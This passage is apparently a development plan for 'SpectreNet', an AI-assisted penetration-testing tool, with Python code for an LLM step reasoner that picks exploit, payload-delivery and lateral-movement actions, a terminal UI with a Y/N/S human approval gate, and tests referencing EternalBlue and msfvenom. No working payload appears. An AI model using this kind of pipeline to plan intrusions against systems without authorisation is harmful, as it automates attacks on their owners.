log = logging.getLogger("spectrenet")

SYSTEM_PROMPT = """You are an expert penetration tester. Given the current state of an engagement, decide the single best next action.

Output ONLY valid JSON:
{
  "step_id": <integer>,
  "action_type": "recon|exploit|payload_delivery|lateral_movement|post_ex",
  "tool": "tool_name",
  "target": "ip_or_hostname",
  "params": {},
  "risk_level": "LOW|MED|HIGH",
  "rationale": "why this is the best next step"
}

If the engagement is complete or no viable next step exists, output:
{"done": true, "rationale": "reason engagement is complete"}"""


class StepReasoner:
    """Given current session state, decides the optimal next action."""

    def __init__(self, model: ModelInterface):
        self.model = model

    def next_step(self, session_state: dict) -> PlanStep | None:
        context = f"Current engagement state:\n{json.dumps(session_state, indent=2)}"
        raw = self.model.complete(SYSTEM_PROMPT, context)
        return self._parse(raw)

    def _parse(self, raw: str) -> PlanStep | None:
        try:
            text = raw.strip()
            if text.startswith("```"):
                parts = text.split("```")
                text = parts[1]
                if text.startswith("json"):
                    text = text[4:]
            data = json.loads(text.strip())
            if data.get("done"):
                return None
            step = PlanStep(
                step_id=data["step_id"],
                action_type=data["action_type"],
                tool=data["tool"],
                target=data["target"],
                params=data.get("params", {}),
                risk_level=data.get("risk_level", "LOW"),
                rationale=data.get("rationale", ""),
            )
            if step.action_type in INTRUSIVE_ACTIONS:
                step.requires_approval = True
            return step
        except Exception as e:
            log.error("Failed to parse step reasoner output: %s | raw: %.200s", e, raw)
            return None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_step_reasoner.py -v`
Expected: PASS (5 passed)

- [ ] **Step 5: Commit**

```bash
git add spectrenet/ai/step_reasoner.py tests/test_step_reasoner.py
git commit -m "feat: add AI step reasoner (session state to next action)"
```

---

## Task 8: TUI integration — approval gate + mission command

**Files:**
- Modify: `spectrenet/tui/app.py`
- Modify: `spectrenet/cli.py`

This task wires the approval gate and AI pipeline into the TUI. The `mission` command triggers the AI pipeline; intrusive steps display the approval gate and block until Y/N/S is entered. No new unit tests (TUI integration); verified by smoke run.

- [ ] **Step 1: Read the current `spectrenet/tui/app.py`** to get the exact content, then replace it entirely with the updated version below.

Run: `python -c "import spectrenet.tui.app; print('imports ok')"` first to confirm current state.

- [ ] **Step 2: Write the updated `spectrenet/tui/app.py`**

```python
# spectrenet/tui/app.py
import asyncio
from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, Input, RichLog
from textual.containers import Vertical
from spectrenet import APP_NAME, TAGLINE, __version__
from spectrenet.theme import BANNER, CYAN, NAVY_DEEP
from spectrenet.tui.command_parser import parse_command
from spectrenet.tui.approval_gate import (
    ActionCard, ApprovalResult, format_action_card
)

class SpectreNetApp(App):
    CSS = f"""
    Screen {{ background: {NAVY_DEEP}; }}
    RichLog {{ border: round {CYAN}; height: 1fr; }}
    Input {{ border: round {CYAN}; }}
    """
    TITLE = APP_NAME
    SUB_TITLE = TAGLINE

    def __init__(self, registry, recon, model=None, **kwargs):
        super().__init__(**kwargs)
        self.registry = registry
        self.recon = recon
        self.model = model
        self._approval_event: asyncio.Event | None = None
        self._approval_result: ApprovalResult | None = None

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        with Vertical():
            self.log_view = RichLog(highlight=True, markup=True)
            yield self.log_view
            yield Input(placeholder="snet> scan | wrappers | mission <target> <desc> | help | quit")
        yield Footer()

    def on_mount(self) -> None:
        self.log_view.write(f"[bold {CYAN}]{BANNER}[/]")
        self.log_view.write(f"[{CYAN}]{APP_NAME} v{__version__}[/] — {TAGLINE}")
        self.log_view.write(f"Wrappers available: {', '.join(self.registry.available()) or 'none'}")
        ai_status = "active" if self.model else "inactive (classic mode)"
        self.log_view.write(f"AI: {ai_status}")

    def on_input_submitted(self, event: Input.Submitted) -> None:
        raw = event.value.strip()
        event.input.value = ""
        if not raw:
            return

        # Approval gate intercept — if a gate is pending, only accept Y/N/S
        if self._approval_event is not None:
            key = raw.upper()
            if key in ("Y", "N", "S"):
                self._approval_result = ApprovalResult(key)
                self._approval_event.set()
            else:
                self.log_view.write(
                    f"[yellow]Approval pending — enter Y (approve), N (deny), or S (skip)[/]"
                )
            return

        cmd = parse_command(raw)
        if cmd is None:
            return
        if cmd.verb in ("quit", "exit"):
            self.exit()
        elif cmd.verb == "help":
            self.log_view.write(
                "Commands: scan <target> [--tool nmap|masscan], "
                "mission <target> <description>, wrappers, help, quit"
            )
        elif cmd.verb == "wrappers":
            self.log_view.write("Registered: " + ", ".join(self.registry.names()))
        elif cmd.verb == "scan":
            self._do_scan(cmd)
        elif cmd.verb == "mission":
            self._do_mission(cmd)
        else:
            self.log_view.write(f"[red]Unknown command:[/] {cmd.verb}")

    def _do_scan(self, cmd) -> None:
        if not cmd.args:
            self.log_view.write("[red]scan requires a target[/]")
            return
        tool = cmd.flags.get("tool", "nmap")
        target = cmd.args[0]
        try:
            result = self.recon.scan(tool=tool, target=target)
            for host in result["hosts"]:
                ports = ", ".join(str(p["port"]) for p in host["ports"])
                self.log_view.write(f"[{CYAN}]{host['ip']}[/]  ports: {ports}")
        except Exception as e:
            self.log_view.write(f"[red]scan failed:[/] {e}")

    def _do_mission(self, cmd) -> None:
        if self.model is None:
            self.log_view.write(
                "[red]AI mode not active.[/] Start with --model ollama to enable."
            )
            return
        if len(cmd.args) < 2:
            self.log_view.write("[red]usage: mission <target> <description words...>[/]")
            return
        target = cmd.args[0]
        description = " ".join(cmd.args[1:])
        self.run_worker(self._run_mission_pipeline(target, description), exclusive=True)

    async def _run_mission_pipeline(self, target: str, description: str) -> None:
        from spectrenet.ai.mission_planner import MissionPlanner
        planner = MissionPlanner(self.model)
        self.log_view.write(f"[{CYAN}]▶ Planning:[/] {description}")
        plan = planner.plan(description, recon_results={"target": target})
        if not plan.steps:
            self.log_view.write("[red]Planner returned an empty plan.[/]")
            return
        self.log_view.write(f"[{CYAN}]{len(plan.steps)} steps planned:[/]")
        for step in plan.steps:
            approval_flag = " [APPROVAL REQUIRED]" if step.requires_approval else ""
            self.log_view.write(
                f"  {step.step_id}. {step.action_type} → {step.tool} @ {step.target}{approval_flag}"
            )

        for step in plan.steps:
            if step.requires_approval:
                card = ActionCard(
                    action=f"{step.action_type}/{step.tool}",
                    target=step.target,
                    module=step.tool,
                    risk=step.risk_level,
                    reason=step.rationale or "AI-planned intrusive action",
                )
                result = await self._request_approval(card)
                if result == ApprovalResult.DENIED:
                    self.log_view.write(f"[yellow]Step {step.step_id} denied.[/]")
                    continue
                if result == ApprovalResult.SKIPPED:
                    self.log_view.write(f"[yellow]Step {step.step_id} skipped.[/]")
                    continue

            await self._execute_step(step)

        self.log_view.write(f"[{CYAN}]✓ Mission pipeline complete.[/]")

    async def _request_approval(self, card: ActionCard) -> ApprovalResult:
        self._approval_event = asyncio.Event()
        self._approval_result = None
        self.log_view.write(format_action_card(card))
        await self._approval_event.wait()
        self._approval_event = None
        return self._approval_result

    async def _execute_step(self, step) -> None:
        if step.action_type == "recon":
            try:
                result = self.recon.scan(tool=step.tool, target=step.target, **step.params)
                for host in result.get("hosts", []):
                    ports = ", ".join(str(p["port"]) for p in host["ports"])
                    self.log_view.write(f"[{CYAN}]{host['ip']}[/]  ports: {ports}")
            except Exception as e:
                self.log_view.write(f"[red]Step {step.step_id} failed:[/] {e}")
        else:
            self.log_view.write(
                f"[yellow]Step {step.step_id}:[/] {step.action_type} via {step.tool} "
                f"@ {step.target} — dispatched"
            )
```

- [ ] **Step 3: Update `spectrenet/cli.py`** to pass the model to the TUI if configured:

```python
# spectrenet/cli.py
import argparse
from pathlib import Path
from spectrenet.config import load_config
from spectrenet.logging_setup import setup_logging
from spectrenet.wrappers.registry import WrapperRegistry
from spectrenet.engines.recon import ReconEngine
from spectrenet.tui.app import SpectreNetApp


def main() -> None:
    parser = argparse.ArgumentParser(
        prog="spectrenet", description="SpectreNet — Always one step ahead"
    )
    parser.add_argument("--config", default="config.yaml")
    parser.add_argument("--model", choices=["ollama", "none"], default=None,
                        help="AI model backend (overrides config)")
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    log = setup_logging(cfg.log_level)
    log.info("Starting SpectreNet (operator=%s)", cfg.operator_name)

    registry = WrapperRegistry()
    registry.discover()
    recon = ReconEngine(registry)

    model = None
    backend = args.model or cfg.model_backend
    if backend == "ollama":
        try:
            from spectrenet.model.ollama_backend import OllamaBackend
            model = OllamaBackend(model=cfg.model_name, url=cfg.ollama_url)
            log.info("AI mode: Ollama (%s)", cfg.model_name)
        except Exception as e:
            log.warning("Failed to initialise Ollama backend: %s — running in Classic mode", e)

    SpectreNetApp(registry=registry, recon=recon, model=model).run()


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Smoke-verify the updated TUI constructs**

Save as `_smoke_p2.py` and run `python _smoke_p2.py > _smoke_p2_out.txt 2>&1`, then read the output:

```python
# _smoke_p2.py
from spectrenet.wrappers.registry import WrapperRegistry
from spectrenet.engines.recon import ReconEngine
from spectrenet.tui.app import SpectreNetApp
from spectrenet.ai.mission_planner import MissionPlanner
from spectrenet.ai.step_reasoner import StepReasoner
from spectrenet.tui.approval_gate import ActionCard, ApprovalResult, format_action_card

r = WrapperRegistry()
r.discover()
app = SpectreNetApp(registry=r, recon=ReconEngine(r), model=None)
print("app constructed (classic mode)")

card = ActionCard("exploit/multi/handler", "10.0.0.1:445",
                  "ms17_010_eternalblue", "HIGH", "test")
rendered = format_action_card(card)
assert "APPROVAL REQUIRED" in rendered
print("approval gate: ok")
print("Phase 2 smoke: PASS")
```

Expected output: `app constructed (classic mode)`, `approval gate: ok`, `Phase 2 smoke: PASS`.
Delete the temp files after.

- [ ] **Step 5: Run full suite to confirm no regressions**

Run: `python -m pytest tests/ -v`
Expected: all 20 prior tests + the 7 new Phase 2 tests pass (~27 total, adjusting for task count).

- [ ] **Step 6: Commit**

```bash
git add spectrenet/tui/app.py spectrenet/cli.py
git commit -m "feat: wire approval gate and AI mission pipeline into TUI"
```

---

## Task 9: Full Phase 2 suite + Definition of Done

**Files:**
- No new files — verification and DoD checks only.

- [ ] **Step 1: Run the complete test suite**

Run: `python -m pytest tests/ -v`
Expected: all tests pass. Paste output. If any fail, fix before proceeding.

- [ ] **Step 2: Run coverage**

Run: `python -m pytest tests/ --cov=spectrenet --cov-report=term-missing`
Expected: all core Phase 2 modules (msfvenom wrapper, msf/bridge, exploit_modules/base+registry, engines/exploit, tui/approval_gate, ai/mission_planner, ai/step_reasoner) show high coverage. `tui/app.py` and `cli.py` remain lower (integration-only).

- [ ] **Step 3: DoD — Verify msfvenom wrapper is autodiscovered**

Run:
```python
# save as _dod_p2.py
from spectrenet.wrappers.registry import WrapperRegistry
r = WrapperRegistry(); r.discover()
print("wrappers:", r.names())
assert "msfvenom" in r.names(), "msfvenom not discovered"
print("msfvenom autodiscovery: PASS")
```
Run: `python _dod_p2.py`
Expected: `msfvenom` in the list.

- [ ] **Step 4: DoD — Verify approval gate round-trip data**

Run:
```python
from spectrenet.tui.approval_gate import ActionCard, ApprovalResult, format_action_card
card = ActionCard("exploit/multi/handler", "192.168.1.45:445",
                  "ms17_010_eternalblue", "HIGH", "SMB RCE candidate")
rendered = format_action_card(card)
assert "[Y]" in rendered and "[N]" in rendered and "[S]" in rendered
assert ApprovalResult.APPROVED.value == "Y"
print("approval gate data: PASS")
```

- [ ] **Step 5: DoD — Verify AI planner + reasoner parse correctly**

Run:
```python
from spectrenet.ai.mission_planner import MissionPlanner, PlanStep
from spectrenet.ai.step_reasoner import StepReasoner
from spectrenet.model.interface import ModelInterface

class M(ModelInterface):
    def complete(self, s, u):
        return '{"steps":[{"step_id":1,"action_type":"recon","tool":"nmap","target":"10.0.0.1","params":{},"risk_level":"LOW","rationale":"test"}]}'

plan = MissionPlanner(M()).plan("test mission")
assert len(plan.steps) == 1 and plan.steps[0].tool == "nmap"
print("mission planner: PASS")

class M2(ModelInterface):
    def complete(self, s, u):
        return '{"step_id":2,"action_type":"exploit","tool":"test","target":"10.0.0.1","params":{},"risk_level":"HIGH","rationale":"x"}'

step = StepReasoner(M2()).next_step({"hosts": []})
assert step is not None and step.requires_approval is True
print("step reasoner: PASS")
```

- [ ] **Step 6: DoD — Verify MSF bridge graceful failure**

Run:
```python
from spectrenet.msf.bridge import MsfBridge
b = MsfBridge(host="127.0.0.1", port=19999)
assert b.connect() is False
assert b.is_connected() is False
print("MSF bridge graceful fail: PASS")
```

- [ ] **Step 7: Delete all `_dod_p2.py` and `_smoke_p2.py` temp files**

- [ ] **Step 8: Push to GitHub**

```bash
git push origin phase1-foundation
```

- [ ] **Step 9: Final commit (update roadmap in README if desired)**

Optionally update the Phase 2 checklist in `README.md` to reflect completion, then:
```bash
git add README.md
git commit -m "docs: mark Phase 2 complete in roadmap"
git push origin phase1-foundation
```

---

## Definition of Done (Phase 2)

- [ ] `python -m pytest tests/ -v` — all tests pass (Phase 1 + Phase 2)
- [ ] `msfvenom` appears in `WrapperRegistry().discover()` output
- [ ] `MissionPlanner` parses a JSON plan and marks intrusive steps `requires_approval=True`
- [ ] `StepReasoner` returns a `PlanStep` or `None` (done) from any session state dict
- [ ] `MsfBridge` connects with an injected client; fails gracefully without `pymetasploit3`
- [ ] `ExploitEngine.run_native()` returns `ExploitResult`; unknown modules return failure result
- [ ] `format_action_card()` renders Y/N/S prompt with all card fields
- [ ] TUI smoke confirms `SpectreNetApp` constructs with `model=None` (Classic) and with an injected `ModelInterface`
- [ ] `snet --help` shows `--model` flag

---

*SpectreNet Phase 2 — Core Attack Loop. Always one step ahead.*
